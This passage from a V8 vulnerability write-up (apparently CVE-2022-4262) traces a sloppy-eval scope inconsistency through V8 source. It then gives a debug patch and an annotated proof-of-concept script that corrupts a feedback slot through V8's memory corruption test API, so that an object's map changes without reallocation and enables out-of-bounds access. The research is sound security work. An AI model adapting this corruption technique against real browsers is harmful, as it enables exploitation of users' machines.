To summarize, due to the difference of twice parsing's scope, the sloppy-eval flag of arrow function is also marked differently. That caused the bytecode difference between GC.

### Different bytecode generation upon different Sloppy-eval Flag

#### Description in JavaScript language level

To have a intuitive understanding of why bytecode types has changed, i.e., `LdaGlobal` -> `LdaLookupGlobalSlot`, `LdaContextSlot` -> `LdaLookupContextSlot`, `StaGlobal` -> `StaLookupSlot`, we need to review `Changed behaviour of eval function in strict mode` in `Background Knowledges` subsection:

> In sloppy mode, `eval("var x;")` introduces a variable `x` into the surrounding function or the global scope. This means that, in general, in a function containing a call to `eval`, every name not referring to an argument or local variable must be mapped to a particular definition **at runtime** (because that `eval` might have introduced a new variable that would hide the outer variable).

The `lookup` in new bytecode types means exactly find a variable definition **at runtime**.

#### Description by code auditing

As an example, we are going to describe why `aa = 0xdeadbbed` will be compiled into `StaGlobal` and `StaLookupSlot`, respecively.

##### BytecodeGenerator::BuildVariableAssignment function

The function `BytecodeGenerator::BuildVariableAssignment` in `src/interpreter/bytecode-generator.cc:3734` decides which type of bytecode should be emitted when meeting variable assignment expression.

```cpp
void BytecodeGenerator::BuildVariableAssignment(
    Variable* variable, Token::Value op, HoleCheckMode hole_check_mode,
    LookupHoistingMode lookup_hoisting_mode) {
  VariableMode mode = variable->mode();
  RegisterAllocationScope assignment_register_scope(this);
  BytecodeLabel end_label;
  switch (variable->location()) {
    // ...
    case VariableLocation::UNALLOCATED: {
      BuildStoreGlobal(variable);
      break;
    }
    // ...
    case VariableLocation::LOOKUP: {
      builder()->StoreLookupSlot(variable->raw_name(), language_mode(),
                                 lookup_hoisting_mode);
      break;
    }
    // ...
  }
}
```

On the first bytecode generation, `variable->location()` is `VariableLocation::UNALLOCATED` and the bytecode generator emits a `StaGlobal`. On the second bytecode generation, `variable->location()` is `VariableLocation::LOOKUP` and the bytecode generator emits a `StaLookupSlot`.

To determine where does the value of `variable->location()` come from, we need to analyze `Scope::Lookup`.

##### Scope::Lookup function

The function `Scope::Lookup` in `src/ast/scopes.cc:2071` determines the location of a `Variable`.

```cpp
template <Scope::ScopeLookupMode mode>
Variable* Scope::Lookup(VariableProxy* proxy, Scope* scope, // Line 2071
                        Scope* outer_scope_end, Scope* cache_scope,
                        bool force_context_allocation) {
  // If we have already passed the cache scope in earlier recursions, we should
  // first quickly check if the current scope uses the cache scope before
  // continuing.
  if (mode == kDeserializedScope &&
      scope->deserialized_scope_uses_external_cache()) {
    Variable* var = cache_scope->variables_.Lookup(proxy->raw_name());
    if (var != nullptr) return var;
  }

  while (true) {
    DCHECK_IMPLIES(mode == kParsedScope, !scope->is_debug_evaluate_scope_);
    // Short-cut: whenever we find a debug-evaluate scope, just look everything
    // up dynamically. Debug-evaluate doesn't properly create scope info for the
    // lookups it does. It may not have a valid 'this' declaration, and anything
    // accessed through debug-evaluate might invalidly resolve to
    // stack-allocated variables.
    // TODO(yangguo): Remove once debug-evaluate creates proper ScopeInfo for
    // the scopes in which it's evaluating.
    if (mode == kDeserializedScope &&
        V8_UNLIKELY(scope->is_debug_evaluate_scope_)) {
      DCHECK(scope->deserialized_scope_uses_external_cache() ||
             scope == cache_scope);
      return cache_scope->NonLocal(proxy->raw_name(), VariableMode::kDynamic);
    }

    // Try to find the variable in this scope.
    Variable* var;
    if (mode == kParsedScope) {
      var = scope->LookupLocal(proxy->raw_name());
    } else {
      DCHECK_EQ(mode, kDeserializedScope);
      bool external_cache = scope->deserialized_scope_uses_external_cache();
      if (!external_cache) {
        // Check the cache on each deserialized scope, up to the main cache
        // scope when we get to it (we may still have deserialized scopes
        // in-between the initial and cache scopes so we can't just check the
        // cache before the loop).
        var = scope->variables_.Lookup(proxy->raw_name());
        if (var != nullptr) return var;
      }
      var = scope->LookupInScopeInfo(proxy->raw_name(),
                                     external_cache ? cache_scope : scope);
    }

    // We found a variable and we are done. (Even if there is an 'eval' in this
    // scope which introduces the same variable again, the resulting variable
    // remains the same.)
    //
    // For sloppy eval though, we skip dynamic variable to avoid resolving to a
    // variable when the variable and proxy are in the same eval execution. The
    // variable is not available on subsequent lazy executions of functions in
    // the eval, so this avoids inner functions from looking up different
    // variables during eager and lazy compilation.
    //
    // TODO(leszeks): Maybe we want to restrict this to e.g. lookups of a proxy
    // living in a different scope to the current one, or some other
    // optimisation.
    if (var != nullptr &&
        !(scope->is_eval_scope() && var->mode() == VariableMode::kDynamic)) {
      if (mode == kParsedScope && force_context_allocation &&
          !var->is_dynamic()) {
        var->ForceContextAllocation();
      }
      return var;
    }

    if (scope->outer_scope_ == outer_scope_end) break;

    DCHECK(!scope->is_script_scope());
    if (V8_UNLIKELY(scope->is_with_scope())) {
      return LookupWith(proxy, scope, outer_scope_end, cache_scope,
                        force_context_allocation);
    }
    if (V8_UNLIKELY(
            scope->is_declaration_scope() &&
            scope->AsDeclarationScope()->sloppy_eval_can_extend_vars())) {
      return LookupSloppyEval(proxy, scope, outer_scope_end, cache_scope, // Line 2150
                              force_context_allocation);
    }

    force_context_allocation |= scope->is_function_scope();
    scope = scope->outer_scope_;

    // TODO(verwaest): Separate through AnalyzePartially.
    if (mode == kParsedScope && !scope->scope_info_.is_null()) {
      DCHECK_NULL(cache_scope);
      cache_scope = scope->GetNonEvalDeclarationScope();
      return Lookup<kDeserializedScope>(proxy, scope, outer_scope_end,
                                        cache_scope);
    }
  }

  // We may just be trying to find all free variables. In that case, don't
  // declare them in the outer scope.
  // TODO(marja): Separate Lookup for preparsed scopes better.
  if (mode == kParsedScope && !scope->is_script_scope()) {
    return nullptr;
  }

  // No binding has been found. Declare a variable on the global object.
  return scope->AsDeclarationScope()->DeclareDynamicGlobal( // Line 2174
      proxy->raw_name(), NORMAL_VARIABLE,
      mode == kDeserializedScope ? cache_scope : scope);
}
```

On the first parsing, the resolving of variable `aa` will finally reach line 2174 and declare a new dynamic global object, which is accord with `VariableLocation::UNALLOCATED`. However, on the second parsing, the resolving of variable `aa` will finally enter into `LookupSloppyEval` at line 2150.

##### Scope::LookupSloppyEval function

`Scope::LookupSloppyEval` is a dedicated handler for resolving variables in sloppy-eval scope in `src/ast/scopes.cc:2226`.

```cpp
Variable* Scope::LookupSloppyEval(VariableProxy* proxy, Scope* scope, // Line 2226
                                  Scope* outer_scope_end, Scope* cache_scope,
                                  bool force_context_allocation) {
  DCHECK(scope->is_declaration_scope() &&
         scope->AsDeclarationScope()->sloppy_eval_can_extend_vars());

  // If we're compiling eval, it's possible that the outer scope is the first
  // ScopeInfo-backed scope. We use the next declaration scope as the cache for
  // this case, to avoid complexity around sloppy block function hoisting and
  // conflict detection through catch scopes in the eval.
  Scope* entry_cache = cache_scope == nullptr
                           ? scope->outer_scope()->GetNonEvalDeclarationScope()
                           : cache_scope;
  Variable* var =
      scope->outer_scope_->scope_info_.is_null()
          ? Lookup<kParsedScope>(proxy, scope->outer_scope_, outer_scope_end,
                                 nullptr, force_context_allocation)
          : Lookup<kDeserializedScope>(proxy, scope->outer_scope_,  // Line 2243
                                       outer_scope_end, entry_cache);
  if (var == nullptr) return var;

  // We may not want to use the cache scope, change it back to the given scope
  // if necessary.
  if (!scope->deserialized_scope_uses_external_cache()) {
    // For a deserialized scope, we'll be replacing the cache_scope.
    DCHECK_IMPLIES(!scope->scope_info_.is_null(), cache_scope != nullptr);
    cache_scope = scope;
  }

  // A variable binding may have been found in an outer scope, but the current
  // scope makes a sloppy 'eval' call, so the found variable may not be the
  // correct one (the 'eval' may introduce a binding with the same name). In
  // that case, change the lookup result to reflect this situation. Only
  // scopes that can host var bindings (declaration scopes) need be considered
  // here (this excludes block and catch scopes), and variable lookups at
  // script scope are always dynamic.
  if (var->IsGlobalObjectProperty()) {
    Scope* target = cache_scope == nullptr ? scope : cache_scope;
    var = target->NonLocal(proxy->raw_name(), VariableMode::kDynamicGlobal);  // Line 2264
  }

  if (var->is_dynamic()) return var;

  Variable* invalidated = var;
  if (cache_scope != nullptr) cache_scope->variables_.Remove(invalidated);

  Scope* target = cache_scope == nullptr ? scope : cache_scope;
  var = target->NonLocal(proxy->raw_name(), VariableMode::kDynamicLocal);
  var->set_local_if_not_shadowed(invalidated);

  return var;
}


Variable* Scope::NonLocal(const AstRawString* name, VariableMode mode) {  // Line 2057
  // Declare a new non-local.
  DCHECK(IsDynamicVariableMode(mode));
  bool was_added;
  Variable* var = variables_.Declare(zone(), this, name, mode, NORMAL_VARIABLE,
                                     kCreatedInitialized, kNotAssigned,
                                     IsStaticFlag::kNotStatic, &was_added);
  // Allocate it by giving it a dynamic lookup.
  var->AllocateTo(VariableLocation::LOOKUP, -1);  // Line 2065 [!]
  return var;
}
```

When entering `Scope::LookupSloppyEval` on second parsing, the control flow will first enter into `Lookup<kDeserializedScope>()` at line 2243 to get a new dynamic global object, then it goes into `target->NonLocal()` at line 2264 as the comments says:

> A variable binding may have been found in an outer scope, but the current scope makes a sloppy 'eval' call, so the found variable may not be the correct one (the 'eval' may introduce a binding with the same name). In that case, change the lookup result to reflect this situation. Only scopes that can host var bindings (declaration scopes) need be considered here (this excludes block and catch scopes), and variable lookups at script scope are always dynamic.

Then the code at line 2065 assign the variable's location to `VariableLocation::LOOKUP`, which is in accordance with the result in previous section.

## Conclusion

This vulnerability is caused by a outer scope inconsistentency across the two parsing process. The inconsistency lead to the inconsistency of sloppy-eval flag in arrow function then caused the difference of bytecode generation.

# Simplified Exploit

## Sources

### Debug Patch Diff

In order to have an intuitive presentation of feedback vector when debugging, please save the following patch with filename `debug.patch`, then apply it with command `git apply debug.patch`.

```diff
diff --git a/src/builtins/ic-callable.tq b/src/builtins/ic-callable.tq
index a9cc43c716b..9df2305ad55 100644
--- a/src/builtins/ic-callable.tq
+++ b/src/builtins/ic-callable.tq
@@ -100,6 +100,7 @@ macro CollectCallFeedback(
   const feedbackVector =
       Cast<FeedbackVector>(maybeFeedbackVector) otherwise return;
   IncrementCallCount(feedbackVector, slotId);
+  Print("vector", feedbackVector);

   try {
     const feedback: MaybeObject =
```

### Exploit Viability Examining Source

This is a modified version of `test.js` from @mistymntncop's exploit repo [mistymntncop/CVE-2022-4262](#RefList-2).

```javascript
var sandbox_mem_view = new Sandbox.MemoryView(0, 0xfffffff8);
var sandbox_dv = new DataView(sandbox_mem_view);
function addr_of(o) {
    let result = Sandbox.getAddressOf(o);
    return result;
}
function read_u32(addr) {
    let result = sandbox_dv.getUint32(addr, true);
    return result;
}
function write_u32(addr, val) {
    sandbox_dv.setUint32(addr, val, true);
}
function unptr(addr) {
    return addr & ~3;
}
function unsmi(val) {
    return val >> 1;
}

function store(o, val) {
    o.p1 = val;
}
%EnsureFeedbackVectorForFunction(store);

// leave this or else the alignment is mucked up
var loadbearer = { p1: 1, p2: 2, p3: 3, p4: 4 };

var big_obj = { p1: 1, p2: 2, p3: 3, p4: 4, p5: 5, p6: 6, p7: 7, p8: 8, p9: 9, p10: 10, p11: 11, p12: 12, p13: 13, p14: 14, p15: 15, p16: 16, p17: 17, p18: 18 };
big_obj.extra = 1;  // transition to a new map with a clear prototype validity cell: prototype_validity transition from 1 to 0

var small_obj = { p1: 1, p2: 2, p3: 3, p4: 4 };
var arr1 = [1.85419992257717e-310, 1.85419992257717e-310, 1.85419992257717e-310, 1.85419992257717e-310]; // 0x0000222200002222
var arr2 = [small_obj, 2, 3, 4, 5, 6, 7, 8];
store(small_obj, 0x1337);

let store_func_addr = addr_of(store);
%GlobalPrint("store_func_addr = " + store_func_addr.toString(16) + "\n");
%DebugPrint(store);
let feedback_cell_addr = unptr(read_u32(store_func_addr + 0x14));
%GlobalPrint("feedback_cell_addr = " + feedback_cell_addr.toString(16) + "\n");
let feedback_vector_addr = unptr(read_u32(feedback_cell_addr + 4));
%GlobalPrint("feedback_vector_addr = " + feedback_vector_addr.toString(16) + "\n");
let raw_feedback_slots = feedback_vector_addr + 0x20;
%GlobalPrint("raw_feedback_slots = " + raw_feedback_slots.toString(16) + "\n");

let slot0 = unptr(read_u32(raw_feedback_slots + 0 * 4));
%GlobalPrint("slot0 = " + slot0.toString(16) + "\n");
let slot1 = unptr(read_u32(raw_feedback_slots + 1 * 4));
%GlobalPrint("slot1 = " + slot1.toString(16) + "\n");

let small_obj_addr = addr_of(small_obj);
%GlobalPrint("small_obj_addr = " + small_obj_addr.toString(16) + "\n");
%DebugPrint(small_obj);
let big_obj_addr = addr_of(big_obj);
%GlobalPrint("big_obj_addr = " + big_obj_addr.toString(16) + "\n");
%DebugPrint(big_obj);
let big_obj_map = read_u32(big_obj_addr);
%GlobalPrint("big_obj_map = " + big_obj_map.toString(16) + "\n");

%DebugPrint(store);
write_u32(raw_feedback_slots + 1 * 4, big_obj_map | 0b11);
%DebugPrint(store);

%DebugPrint(small_obj);
store(small_obj, 0x1111);
%DebugPrint(small_obj); // we just turned small_obj into a big_obj
```

## Background Knowledges

### V8's Memory Corruption API

To ease testing of the sandbox and its ability to limit attackers in corrupting memory outside the V8 heap, a [memory corruption API<sup>27</sup>](#RefList-27) was introduced. [<sup>26</sup>](#RefList-26)

This API can be enabled with the `v8_expose_memory_corruption_api` flag and allows us, as the name suggests, to corrupt arbitrary memory inside the V8 heap. In addition, an `addrOf` primitive is exposed, effectively allowing us to get the (relative) address of arbitrary javascript objects.

All of this is encapsulated in a new `Sandbox` object that is accessible from within javascript.

The code below shows how `Sandbox.MemoryView` can be used in combination with a DataView to achieve an arbitrary read/write inside the sandbox. Moreover, the following code defined different readHeap/writeHeap functions for convenience that make use of this DataView to read from or write to the V8 heap at the given relative addresses.

```javascript
var sbxMemView = new Sandbox.MemoryView(0, 0xfffffff8);
var dv = new DataView(sbxMemView);
var addrOf = (o) => Sandbox.getAddressOf(o);

var readHeap4 = (offset) => dv.getUint32(offset, true);
var readHeap8 = (offset) => dv.getBigUint64(offset, true);
var writeHeap1 = (offset, value) => dv.setUint8(offset, value, true);
var writeHeap4 = (offset, value) => dv.setUint32(offset, value, true);
var writeHeap8 = (offset, value) => dv.setBigUint64(offset, value, true);
```

## Exploit Viability

### Exploit Viability Overview

The main idea of exploit viability checking source is to mutate the second element of `SetNamedStrict` feedback slot from a Smi handler to a map `mA`. Then when the bytecode 
`SetNamedStrict` is executing with a receiver object `o` with map `mB`, the map of receiver will transition from `mB` to `mA` without reallocating object cell. Once `mA` is indicating a larger object than `mB`, it can cause a Out of Bound access when using `o`.

### Explaination of Exploit Viability Examining Source

```javascript
var sandbox_mem_view = new Sandbox.MemoryView(0, 0xfffffff8);
var sandbox_dv = new DataView(sandbox_mem_view);
function addr_of(o) {
    let result = Sandbox.getAddressOf(o);
    return result;
}
function read_u32(addr) {
    let result = sandbox_dv.getUint32(addr, true);
    return result;
}
function write_u32(addr, val) {
    sandbox_dv.setUint32(addr, val, true);
}
function unptr(addr) {
    return addr & ~3;
}
function unsmi(val) {
    return val >> 1;
}

// The `store` function have a feedback slot `SetNamedSloppy` with two feedback elements
function store(o, val) {
    o.p1 = val; // `SetNamedProperty` bytecode, correspond to `SetNamedSloppy` feedback slot
}
// Install a feedback vector for function `store`
%EnsureFeedbackVectorForFunction(store);

// leave this or else the alignment is mucked up
var loadbearer = { p1: 1, p2: 2, p3: 3, p4: 4 };

// Create a map with its object cell size larger
var big_obj = { p1: 1, p2: 2, p3: 3, p4: 4, p5: 5, p6: 6, p7: 7, p8: 8, p9: 9, p10: 10, p11: 11, p12: 12, p13: 13, p14: 14, p15: 15, p16: 16, p17: 17, p18: 18 };
// transition to a new map with a clear prototype validity cell: prototype_validity transition from 1 to 0
big_obj.extra = 1;

// Create a map with its object cell size smaller
var small_obj = { p1: 1, p2: 2, p3: 3, p4: 4 };
var arr1 = [1.85419992257717e-310, 1.85419992257717e-310, 1.85419992257717e-310, 1.85419992257717e-310]; // 0x0000222200002222
var arr2 = [small_obj, 2, 3, 4, 5, 6, 7, 8];
store(small_obj, 0x1337);

// Get the address of JSFunction `store`
let store_func_addr = addr_of(store);
%GlobalPrint("store_func_addr = " + store_func_addr.toString(16) + "\n");
%DebugPrint(store);
// Get the address of feedback cell
let feedback_cell_addr = unptr(read_u32(store_func_addr + 0x14));
%GlobalPrint("feedback_cell_addr = " + feedback_cell_addr.toString(16) + "\n");
// Get the address of feedback vector
let feedback_vector_addr = unptr(read_u32(feedback_cell_addr + 4));
%GlobalPrint("feedback_vector_addr = " + feedback_vector_addr.toString(16) + "\n");
// Get the start address of feedback vector element
let raw_feedback_slots = feedback_vector_addr + 0x20;
%GlobalPrint("raw_feedback_slots = " + raw_feedback_slots.toString(16) + "\n");

// Get two feedback element content of feedback slot `SetNamedSloppy`
let slot0 = unptr(read_u32(raw_feedback_slots + 0 * 4));
%GlobalPrint("slot0 = " + slot0.toString(16) + "\n");
let slot1 = unptr(read_u32(raw_feedback_slots + 1 * 4));
%GlobalPrint("slot1 = " + slot1.toString(16) + "\n");
// slot0 = 19af1c; slot1 = 660000

// Get the address of `small_obj`
let small_obj_addr = addr_of(small_obj);
%GlobalPrint("small_obj_addr = " + small_obj_addr.toString(16) + "\n");
%DebugPrint(small_obj);
// unptr(small_obj_addr) = 4bc2c; unptr(small_obj_map) = 19af1c
// Get the address of `big_obj`
let big_obj_addr = addr_of(big_obj);
%GlobalPrint("big_obj_addr = " + big_obj_addr.toString(16) + "\n");
%DebugPrint(big_obj);
// Get the map of `big_obj`
let big_obj_map = read_u32(big_obj_addr);
%GlobalPrint("big_obj_map = " + big_obj_map.toString(16) + "\n");
// unptr(big_obj_addr) = 4b5a8;  unptr(big_obj_map) = 19b23c;

%DebugPrint(store);
/*  Feedback Vector of `store`:
 - slot #0 SetNamedSloppy MONOMORPHIC
   [weak] 0x338a0019af1d <Map[28](HOLEY_ELEMENTS)>: StoreHandler(Smi)(kind = kField, descriptor = 0, is in object = 1, representation = s, field index = 3)
 {
     [0]: [weak] 0x338a0019af1d <Map[28](HOLEY_ELEMENTS)>
     [1]: 3342336
  }
*/
// Write the map of `big_obj` to the second element of feedback slot `SetNamedSloppy`
write_u32(raw_feedback_slots + 1 * 4, big_obj_map | 0b11);
%DebugPrint(store);
/*  Feedback Vector of `store`:
 - slot #0 SetNamedSloppy MONOMORPHIC
   [weak] 0x338a0019af1d <Map[28](HOLEY_ELEMENTS)>: StoreHandler(<unexpected>)(0x338a0019b23d <Map[84](HOLEY_ELEMENTS)>) {
     [0]: [weak] 0x338a0019af1d <Map[28](HOLEY_ELEMENTS)>
     [1]: [weak] 0x338a0019b23d <Map[84](HOLEY_ELEMENTS)>
  }
*/

%DebugPrint(small_obj);
/*
DebugPrint: 0x338a0004bc2d: [JS_OBJECT_TYPE]
 - map: 0x338a0019af1d <Map[28](HOLEY_ELEMENTS)> [FastProperties]
 - prototype: 0x338a00184899 <Object map = 0x338a00183f55>
 - elements: 0x338a00002259 <FixedArray[0]> [HOLEY_ELEMENTS]
 - properties: 0x338a00002259 <FixedArray[0]>
 - All own properties (excluding elements): {
    0x338a00199fad: [String] in OldSpace: #p1: 4919 (data field 0), location: in-object
    0x338a00199fbd: [String] in OldSpace: #p2: 2 (const data field 1), location: in-object
    0x338a00199fcd: [String] in OldSpace: #p3: 3 (const data field 2), location: in-object
    0x338a00199fdd: [String] in OldSpace: #p4: 4 (const data field 3), location: in-object
 }
0x338a0019af1d: [Map] in OldSpace
 - type: JS_OBJECT_TYPE
 - instance size: 28
 - inobject properties: 4
 - elements kind: HOLEY_ELEMENTS
 - unused property fields: 0
 - enum length: invalid
 - stable_map
 - back pointer: 0x338a0019aef5 <Map[28](HOLEY_ELEMENTS)>
 - prototype_validity cell: 0x338a001443cd <Cell value= 1>
 - instance descriptors (own) #4: 0x338a0004b569 <DescriptorArray[4]>
 - prototype: 0x338a00184899 <Object map = 0x338a00183f55>
 - constructor: 0x338a0018445d <JSFunction Object (sfi = 0x338a00157129)>
 - dependent code: 0x338a000021e1 <Other heap object (WEAK_ARRAY_LIST_TYPE)>
 - construction counter: 0
*/
// Transition small_obj's map to big_obj's without object cell reallocation via calling `store`
store(small_obj, 0x1111);
%DebugPrint(small_obj);
/*
DebugPrint: 0x338a0004bc2d: [JS_OBJECT_TYPE]
 - map: 0x338a0019b23d <Map[84](HOLEY_ELEMENTS)> [FastProperties]
 - prototype: 0x338a00184899 <Object map = 0x338a00183f55>
 - elements: 0x338a00002259 <FixedArray[0]> [HOLEY_ELEMENTS]
 - properties: 0x338a0004bed5 <PropertyArray[3]>
 - All own properties (excluding elements): {
    0x338a00199fad: [String] in OldSpace: #p1: 4919 (const data field 0), location: in-object
    0x338a00199fbd: [String] in OldSpace: #p2: 2 (const data field 1), location: in-object
    0x338a00199fcd: [String] in OldSpace: #p3: 3 (const data field 2), location: in-object
    0x338a00199fdd: [String] in OldSpace: #p4: 4 (const data field 3), location: in-object
    0x338a0019a001: [String] in OldSpace: #p5: 0x338a00002ac1 <Map(FIXED_DOUBLE_ARRAY_TYPE)> (const data field 4), location: in-object
    0x338a0019a011: [String] in OldSpace: #p6: 4 (const data field 5), location: in-object
    0x338a0019a021: [String] in OldSpace: #p7: 4369 (const data field 6), location: in-object
    0x338a0019a031: [String] in OldSpace: #p8: 4369 (const data field 7), location: in-object
    0x338a0019a041: [String] in OldSpace: #p9: 4369 (const data field 8), location: in-object
    0x338a0019a051: [String] in OldSpace: #p10: 4369 (const data field 9), location: in-object
    0x338a0019a061: [String] in OldSpace: #p11: 4369 (const data field 10), location: in-object
    0x338a0019a071: [String] in OldSpace: #p12: 4369 (const data field 11), location: in-object
    0x338a0019a081: [String] in OldSpace: #p13: 4369 (const data field 12), location: in-object
    0x338a0019a091: [String] in OldSpace: #p14: 4369 (const data field 13), location: in-object
    0x338a0019a0a1: [String] in OldSpace: #p15: 0x338a0018e699 <Map[16](PACKED_DOUBLE_ELEMENTS)> (const data field 14), location: in-object
    0x338a0019a0b1: [String] in OldSpace: #p16: 0x338a00002259 <FixedArray[0]> (const data field 15), location: in-object
    0x338a0019a0c1: [String] in OldSpace: #p17: 0x338a0004bc49 <FixedDoubleArray[4]> (const data field 16), location: in-object
    0x338a0019a0d1: [String] in OldSpace: #p18: 4 (const data field 17), location: in-object
    0x338a0019a0e1: [String] in OldSpace: #extra: 4369 (const data field 18), location: properties[0]
 }
0x338a0019b23d: [Map] in OldSpace
 - type: JS_OBJECT_TYPE
 - instance size: 84
 - inobject properties: 18
 - elements kind: HOLEY_ELEMENTS
 - unused property fields: 2
 - enum length: invalid
 - stable_map
 - back pointer: 0x338a0019b215 <Map[84](HOLEY_ELEMENTS)>
 - prototype_validity cell: 0x338a0019b265 <Cell value= 0>
 - instance descriptors (own) #19: 0x338a0004bb01 <DescriptorArray[19]>
 - prototype: 0x338a00184899 <Object map = 0x338a00183f55>
 - constructor: 0x338a0018445d <JSFunction Object (sfi = 0x338a00157129)>
 - dependent code: 0x338a000021e1 <Other heap object (WEAK_ARRAY_LIST_TYPE)>
 - construction counter: 0
*/
```

### Code causing memory corruption

In this subsubsection, we'll focus on the prerequisite of memory corruption and why satisfying those conditions can reach the target of memory corruption.

#### Prerequisite of feedback slot

In order to transition object `o`'s map from `mA` to `mB` without object cell reallocation, the element in feedback slot must satisfy a series of conditions:
1. The bytecode should be `SetNamedProperty` and its corresponding feedback slot type can be `SetNamedSloppy` or `SetNamedStrict`.
2. The first element of feedback slot should be a weak reference to the map `mA` of object `o`, which indicates this is a monomorphic case.
3. The second element of feedback slot should be a weak reference to the map `mB` that object `o` wants to transition to, in that case this is a map handler. Meanwhile, the map `mB`'s prototype_validity cell content should be 0.

#### Tracing the process of memory corruption

The stack trace of code causing memory corruption is listed below:
```
AccessorAssembler::StoreIC ->
AccessorAssembler::HandleStoreICHandlerCase ->
    BIND(&store_transition_or_global) ->
    BIND(&store_transition) ->
AccessorAssembler::HandleStoreICTransitionMapHandlerCase ->
AccessorAssembler::OverwriteExistingFastDataProperty ->
    BIND(&if_field) ->
    BIND(&backing_store) ->
CodeStubAssembler::StoreMap
```

##### AccessorAssembler::StoreIC

`AccessorAssembler::StoreIC` is located at `src/ic/accessor-assembler.cc:3722`.

```cpp
void AccessorAssembler::StoreIC(const StoreICParameters* p) { // Line 3722
  TVARIABLE(MaybeObject, var_handler,
            ReinterpretCast<MaybeObject>(SmiConstant(0)));

  Label if_handler(this, &var_handler),
      if_handler_from_stub_cache(this, &var_handler, Label::kDeferred),
      try_polymorphic(this, Label::kDeferred),
      try_megamorphic(this, Label::kDeferred), miss(this, Label::kDeferred),
      no_feedback(this, Label::kDeferred);

  TNode<Map> receiver_map = LoadReceiverMap(p->receiver());
  GotoIf(IsDeprecatedMap(receiver_map), &miss);

  GotoIf(IsUndefined(p->vector()), &no_feedback);

  // Check monomorphic case.
  TNode<HeapObjectReference> feedback =
      TryMonomorphicCase(p->slot(), CAST(p->vector()), receiver_map,  // Line 3739
                         &if_handler, &var_handler, &try_polymorphic);
  BIND(&if_handler);
  {
    Comment("StoreIC_if_handler");
    HandleStoreICHandlerCase(p, var_handler.value(), &miss, // Line 3744
                             ICMode::kNonGlobalIC);
  }

  BIND(&try_polymorphic);
  TNode<HeapObject> strong_feedback = GetHeapObjectIfStrong(feedback, &miss);
  {
    // Check polymorphic case.
    Comment("StoreIC_try_polymorphic");
    GotoIfNot(IsWeakFixedArrayMap(LoadMap(strong_feedback)), &try_megamorphic);
    HandlePolymorphicCase(receiver_map, CAST(strong_feedback), &if_handler,
                          &var_handler, &miss);
  }

  BIND(&try_megamorphic);
  {
    // Check megamorphic case.
    GotoIfNot(TaggedEqual(strong_feedback, MegamorphicSymbolConstant()), &miss);

    TryProbeStubCache(isolate()->store_stub_cache(), p->receiver(),
                      CAST(p->name()), &if_handler, &var_handler, &miss);
  }

  BIND(&no_feedback);
  {
    // TODO(v8:12548): refactor SetNamedIC as a subclass of StoreIC, which can
    // be called here and below when !p->IsDefineNamedOwn().
    auto builtin = p->IsDefineNamedOwn() ? Builtin::kDefineNamedOwnIC_NoFeedback
                                         : Builtin::kStoreIC_NoFeedback;
    TailCallBuiltin(builtin, p->context(), p->receiver(), p->name(), p->value(),
                    p->slot());
  }

  BIND(&miss);
  {
    auto runtime = p->IsDefineNamedOwn() ? Runtime::kDefineNamedOwnIC_Miss
                                         : Runtime::kStoreIC_Miss;
    TailCallRuntime(runtime, p->context(), p->value(), p->slot(), p->vector(),
                    p->receiver(), p->name());
  }
}


TNode<HeapObjectReference> AccessorAssembler::TryMonomorphicCase( // Line 72
    TNode<TaggedIndex> slot, TNode<FeedbackVector> vector,
    TNode<Map> lookup_start_object_map, Label* if_handler,
    TVariable<MaybeObject>* var_handler, Label* if_miss) {
  Comment("TryMonomorphicCase");
  DCHECK_EQ(MachineRepresentation::kTagged, var_handler->rep());

  // TODO(ishell): add helper class that hides offset computations for a series
  // of loads.
  int32_t header_size =
      FeedbackVector::kRawFeedbackSlotsOffset - kHeapObjectTag;
  // Adding |header_size| with a separate IntPtrAdd rather than passing it
  // into ElementOffsetFromIndex() allows it to be folded into a single
  // [base, index, offset] indirect memory access on x64.
  TNode<IntPtrT> offset = ElementOffsetFromIndex(slot, HOLEY_ELEMENTS);
  TNode<HeapObjectReference> feedback = CAST(Load<MaybeObject>(
      vector, IntPtrAdd(offset, IntPtrConstant(header_size))));

  // Try to quickly handle the monomorphic case without knowing for sure
  // if we have a weak reference in feedback.
  GotoIfNot(IsWeakReferenceTo(feedback, lookup_start_object_map), if_miss); // Line 92

  TNode<MaybeObject> handler = UncheckedCast<MaybeObject>(
      Load(MachineType::AnyTagged(), vector,
           IntPtrAdd(offset, IntPtrConstant(header_size + kTaggedSize))));

  *var_handler = handler;
  Goto(if_handler);
  return feedback;
}
```

When control flow enters into `AccessorAssembler::StoreIC`, it first calls into `AccessorAssembler::TryMonomorphicCase` to check whether feedback slot is in monomorphic case at line 3739.

When the first element of feedback slot is the weak reference to the map of object `o` (line 92),  feedback slot can be confirmed in monomorphic case then control flow enters into `AccessorAssembler::HandleStoreICHandlerCase` (line 3744).

##### AccessorAssembler::HandleStoreICHandlerCase

`AccessorAssembler::HandleStoreICHandlerCase` is located at `src/ic/accessor-assembler.cc:1241`.

```cpp
void AccessorAssembler::HandleStoreICHandlerCase(
    const StoreICParameters* p, TNode<MaybeObject> handler, Label* miss,
    ICMode ic_mode, ElementSupport support_elements) {
  Label if_smi_handler(this), if_nonsmi_handler(this);
  Label if_proto_handler(this), call_handler(this),
      store_transition_or_global(this);

  Branch(TaggedIsSmi(handler), &if_smi_handler, &if_nonsmi_handler);  // Line 1248

  // |handler| is a Smi, encoding what to do. See SmiHandler methods
  // for the encoding format.
  BIND(&if_smi_handler);
  {
    // ...
  }

  BIND(&if_nonsmi_handler);
  {
    TNode<HeapObjectReference> ref_handler = CAST(handler);
    GotoIf(IsWeakOrCleared(ref_handler), &store_transition_or_global);  // Line 1390
    // ...
  }

  BIND(&store_transition_or_global);
  {
    // Load value or miss if the {handler} weak cell is cleared.
    CSA_DCHECK(this, IsWeakOrCleared(handler));
    TNode<HeapObject> map_or_property_cell =
        GetHeapObjectAssumeWeak(handler, miss);

    Label store_global(this), store_transition(this);
    Branch(IsMap(map_or_property_cell), &store_transition, &store_global);  // Line 1419

    BIND(&store_global);
    {
      // ...
    }
    BIND(&store_transition);
    {
      TNode<Map> map = CAST(map_or_property_cell);
      HandleStoreICTransitionMapHandlerCase(p, map, miss, // Line 1434
                                            p->IsAnyDefineOwn()
                                                ? kDontCheckPrototypeValidity
                                                : kCheckPrototypeValidity);
      Return(p->value());
    }
  }
}
```

When control flow enters into `AccessorAssembler::HandleStoreICHandlerCase`, it first checks whether the second element of feedback vector is a Smi at line 1248, as this element isn't a Smi, the control flow goes to `if_nonsmi_handler`.

Then it checks whether the second element of feedback vector is a weak reference or a cleared value at line 1390, as this element is a weak reference, the control flow goes to `store_transition_or_global`.

